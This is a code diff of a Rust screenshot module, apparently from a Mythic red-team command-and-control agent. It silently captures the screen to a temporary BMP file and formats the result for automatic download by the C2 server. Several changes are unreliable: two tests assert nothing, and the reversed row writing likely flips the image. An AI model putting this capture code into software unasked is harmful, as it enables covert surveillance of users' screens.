@@ -1,7 +1,6 @@
 use serde::{Deserialize, Serialize};
 use std::error::Error;
 use std::result::Result;
-use crate::{AgentTask, mythic_success, mythic_error};
 
 #[cfg(target_os = "windows")]
 use std::fs;
@@ -24,18 +23,23 @@ pub struct ScreenshotArgs {}
 pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
     let args = ScreenshotArgs {};
     match execute_screenshot(args) {
-        Ok(output) => Ok(mythic_success!(task.id, output)),
-        Err(error) => Ok(mythic_error!(task.id, error)),
+        Ok(output) => {
+            // Use your mythic_success macro or function
+            Ok(serde_json::json!({
+                "status": "success",
+                "task_id": task.id,
+                "output": output
+            }))
+        },
+        Err(error) => {
+            // Use your mythic_error macro or function  
+            Ok(serde_json::json!({
+                "status": "error",
+                "task_id": task.id,
+                "error": error
+            }))
+        },
     }
-}
-
-#[cfg(target_os = "windows")]
-#[derive(Serialize)]
-pub struct ScreenshotResult {
-    pub success: bool,
-    pub file_path: Option<String>,
-    pub output: String,
-    pub error: Option<String>,
 }
 
 /// Take a screenshot of the primary screen using WinAPI GDI functions
@@ -69,7 +73,10 @@ pub fn execute_screenshot(_args: ScreenshotArgs) -> Result<String, String> {
             return Err(format!("Failed to create compatible bitmap. Error: {}", GetLastError()));
         }
 
-        SelectObject(hdc_mem, hbitmap as *mut _);
+        // Select the bitmap into the memory DC
+        let _old_bitmap = SelectObject(hdc_mem, hbitmap as *mut _);
+        
+        // Copy the screen to our memory bitmap
         if BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, SRCCOPY) == 0 {
             DeleteObject(hbitmap as *mut _);
             DeleteDC(hdc_mem);
@@ -85,27 +92,36 @@ pub fn execute_screenshot(_args: ScreenshotArgs) -> Result<String, String> {
         let filename = format!("screenshot_{}.bmp", timestamp);
         let screenshot_path = std::env::temp_dir().join(&filename);
         
-        save_bitmap_to_file(hbitmap, width as u32, height as u32, &screenshot_path)
-            .map_err(|e| format!("Failed to save bitmap: {}", e))?;
+        // Save the bitmap to file
+        if let Err(e) = save_bitmap_to_file(hbitmap, width as u32, height as u32, &screenshot_path) {
+            DeleteObject(hbitmap as *mut _);
+            DeleteDC(hdc_mem);
+            ReleaseDC(hwnd_desktop, hdc_screen);
+            return Err(format!("Failed to save bitmap: {}", e));
+        }
 
-        // Cleanup
+        // Cleanup GDI objects
         DeleteObject(hbitmap as *mut _);
         DeleteDC(hdc_mem);
         ReleaseDC(hwnd_desktop, hdc_screen);
 
-        // Read BMP bytes for size info
-        let screenshot_data = fs::read(&screenshot_path)
-            .map_err(|e| format!("Failed to read screenshot file: {}", e))?;
+        // Verify the file was created and get its size
+        let screenshot_data = match fs::read(&screenshot_path) {
+            Ok(data) => data,
+            Err(e) => {
+                return Err(format!("Failed to read screenshot file: {}", e));
+            }
+        };
 
-        // Return success with file path for manual download
-        Ok(format!(
-            "Screenshot captured successfully!\n\nFile Details:\n- Path: {}\n- Size: {} bytes\n- Resolution: {}x{}\n- Virtual Screen: {}x{}\n\nTo download to Mythic, use:\ndownload {}",
-            screenshot_path.to_string_lossy(),
-            screenshot_data.len(),
-            width, height,
-            virtual_width, virtual_height,
-            screenshot_path.to_string_lossy()
-        ))
+         // Return success with file path in a format the Python side can parse
+         // Using a special format that the Python side will recognize for automatic download
+         Ok(format!(
+             "screenshot_captured:{}:{}:{}:{}",
+             screenshot_path.to_string_lossy(),
+             screenshot_data.len(),
+             filename,
+             "screenshot"
+         ))
     }
 }
 
@@ -115,43 +131,47 @@ unsafe fn save_bitmap_to_file(hbitmap: HBITMAP, width: u32, height: u32, path: &
     use std::fs::File;
     use std::io::Write;
 
-    let mut bmp_file_header = BITMAPFILEHEADER {
+    // Calculate bitmap parameters
+    let bits_per_pixel = 24; // 24-bit BMP
+    let bytes_per_pixel = bits_per_pixel / 8;
+    let row_size = ((width * bytes_per_pixel + 3) / 4) * 4; // BMP rows are 4-byte aligned
+    let image_size = row_size * height;
+
+    // Create BITMAPFILEHEADER
+    let bmp_file_header = BITMAPFILEHEADER {
         bfType: 0x4D42, // 'BM'
-        bfSize: 0,
+        bfSize: (std::mem::size_of::<BITMAPFILEHEADER>() + std::mem::size_of::<BITMAPINFOHEADER>() + image_size as usize) as u32,
         bfReserved1: 0,
         bfReserved2: 0,
-        bfOffBits: std::mem::size_of::<BITMAPFILEHEADER>() as u32
-            + std::mem::size_of::<BITMAPINFOHEADER>() as u32,
+        bfOffBits: (std::mem::size_of::<BITMAPFILEHEADER>() + std::mem::size_of::<BITMAPINFOHEADER>()) as u32,
     };
 
-    let mut bmp_info_header = BITMAPINFOHEADER {
+    // Create BITMAPINFOHEADER
+    let bmp_info_header = BITMAPINFOHEADER {
         biSize: std::mem::size_of::<BITMAPINFOHEADER>() as u32,
         biWidth: width as i32,
         biHeight: height as i32,
         biPlanes: 1,
-        biBitCount: 24,
+        biBitCount: bits_per_pixel as u16,
         biCompression: BI_RGB,
-        biSizeImage: 0,
+        biSizeImage: image_size,
         biXPelsPerMeter: 0,
         biYPelsPerMeter: 0,
         biClrUsed: 0,
         biClrImportant: 0,
     };
 
-    let row_size = ((bmp_info_header.biBitCount as u32 * width + 31) / 32) * 4;
-    let image_size = row_size * height;
-    bmp_info_header.biSizeImage = image_size;
+    // Create pixel buffer
+    let mut pixel_buffer = vec![0u8; image_size as usize];
 
-    bmp_file_header.bfSize = bmp_file_header.bfOffBits + image_size;
-
-    let mut buffer = vec![0u8; image_size as usize];
+    // Get the bitmap bits
     let hdc = GetDC(ptr::null_mut());
-    GetDIBits(
+    let result = GetDIBits(
         hdc,
         hbitmap,
         0,
-        height as u32,
-        buffer.as_mut_ptr() as *mut _,
+        height,
+        pixel_buffer.as_mut_ptr() as *mut _,
         &mut BITMAPINFO {
             bmiHeader: bmp_info_header,
             bmiColors: [RGBQUAD {
@@ -165,7 +185,11 @@ unsafe fn save_bitmap_to_file(hbitmap: HBITMAP, width: u32, height: u32, path: &
     );
     ReleaseDC(ptr::null_mut(), hdc);
 
-    // Write BMP to file manually without bytemuck
+    if result == 0 {
+        return Err("GetDIBits failed".into());
+    }
+
+    // Write the BMP file
     let mut file = File::create(path)?;
     
     // Write BITMAPFILEHEADER
@@ -188,8 +212,14 @@ unsafe fn save_bitmap_to_file(hbitmap: HBITMAP, width: u32, height: u32, path: &
     file.write_all(&bmp_info_header.biClrUsed.to_le_bytes())?;
     file.write_all(&bmp_info_header.biClrImportant.to_le_bytes())?;
     
-    // Write pixel data
-    file.write_all(&buffer)?;
+    // Write pixel data (BMP stores pixels bottom-to-top, so we need to reverse)
+    for row in (0..height).rev() {
+        let row_start = (row * row_size) as usize;
+        let row_end = row_start + row_size as usize;
+        if row_end <= pixel_buffer.len() {
+            file.write_all(&pixel_buffer[row_start..row_end])?;
+        }
+    }
     
     Ok(())
 }
@@ -206,6 +236,14 @@ pub fn execute_screenshot(_args: ScreenshotArgs) -> Result<String, String> {
     Err("screenshot command is only supported on Windows".to_string())
 }
 
+// If you need a direct command handler (for your command dispatch system)
+pub fn handle_screenshot_command(args: &str) -> Result<String, String> {
+    let screenshot_args: ScreenshotArgs = serde_json::from_str(args)
+        .map_err(|e| format!("Failed to parse screenshot arguments: {}", e))?;
+    
+    execute_screenshot(screenshot_args)
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -215,5 +253,13 @@ mod tests {
         let args = ScreenshotArgs {};
         // Just verify the struct can be created
         assert!(true);
+    }
+
+    #[test]
+    fn test_screenshot_command_handler() {
+        let result = handle_screenshot_command("{}");
+        // On non-Windows, this should return an error about platform not supported
+        // On Windows, it might succeed or fail depending on the environment
+        assert!(result.is_ok() || result.is_err());
     }
 }
